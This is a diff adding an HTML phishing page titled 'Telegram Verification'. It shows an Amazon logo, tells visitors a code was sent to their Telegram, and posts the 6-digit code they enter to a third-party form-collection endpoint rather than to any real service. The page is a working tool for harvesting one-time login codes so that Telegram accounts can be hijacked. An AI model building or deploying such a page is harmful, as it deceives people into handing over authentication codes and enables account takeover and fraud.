@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Telegram Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #e9eff5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .verification-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 25px;
+    }
+
+    h2 {
+      color: #232f3e;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0073e6;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="verification-box">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
+    <h2>Verification Code</h2>
+    <p>We've sent a code to your Telegram. Please enter it below to continue.</p>
+
+    <form action="https://formspree.io/f/mgvydbna" method="POST">
+      <input type="hidden" name="form" value="verification" />
+      <input type="text" name="Verification Code" placeholder="Enter 6-digit code" required />
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+
+</body>
+</html>
